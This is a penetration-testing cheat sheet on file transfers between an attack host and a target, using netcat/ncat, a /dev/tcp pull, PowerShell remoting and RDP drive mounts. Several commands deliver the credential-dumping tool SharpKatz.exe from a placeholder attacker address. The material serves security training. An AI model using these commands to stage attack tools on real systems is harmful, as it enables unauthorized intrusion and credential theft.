# Miscellaneous File Transfers

## Netcat / Ncat

Two directions: push from attack host → target, or pull from attack host (useful when inbound to target is firewalled).

### Push: Target Listens, Attack Host Sends

```bash
# Target (receiver) — nc
nc -l -p 8000 > SharpKatz.exe

# Target (receiver) — ncat
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```bash
# Attack host (sender) — nc
nc -q 0 <target-IP> 8000 < SharpKatz.exe

# Attack host (sender) — ncat
ncat --send-only <target-IP> 8000 < SharpKatz.exe
```

---

### Pull: Attack Host Listens, Target Connects Out

Use when inbound connections to target are blocked.

```bash
# Attack host (sender) — nc
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Attack host (sender) — ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```bash
# Target (receiver) — nc
nc <attack-IP> 443 > SharpKatz.exe

# Target (receiver) — ncat
ncat <attack-IP> 443 --recv-only > SharpKatz.exe

# Target (receiver) — no nc available, use /dev/tcp
cat < /dev/tcp/<attack-IP>/443 > SharpKatz.exe
```

> `-q 0` / `--send-only` / `--recv-only` — auto-close connection when transfer completes.

---

## PowerShell Remoting (WinRM)

Use when HTTP/HTTPS/SMB are unavailable but WinRM is open (TCP/5985 HTTP, TCP/5986 HTTPS). Requires admin rights or Remote Management Users group membership.

```powershell
# Confirm WinRM is reachable
Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create session
$Session = New-PSSession -ComputerName DATABASE01

# Push file to remote
Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Pull file from remote
Copy-Item -Path "C:\Users\Administrator\Desktop\file.txt" -Destination C:\ -FromSession $Session
```

---

## RDP File Transfer

### Mount Local Folder in RDP Session (Linux → Windows target)

```bash
# rdesktop
rdesktop <IP> -d <DOMAIN> -u <user> -p '<pass>' -r disk:linux='/home/user/files'

# xfreerdp
xfreerdp /v:<IP> /d:<DOMAIN> /u:<user> /p:'<pass>' /drive:linux,/home/user/files
```

Access via `\\tsclient\linux` in Windows Explorer on the target.

### Windows Native (mstsc.exe)

Local Resources → More → Drives → select local drive → connect.

> ⚠️ Mounted drives are only accessible to your session — other users on the target cannot see them.
> ⚠️ Sharing folders containing malware may trigger Windows Defender on your **local** machine.
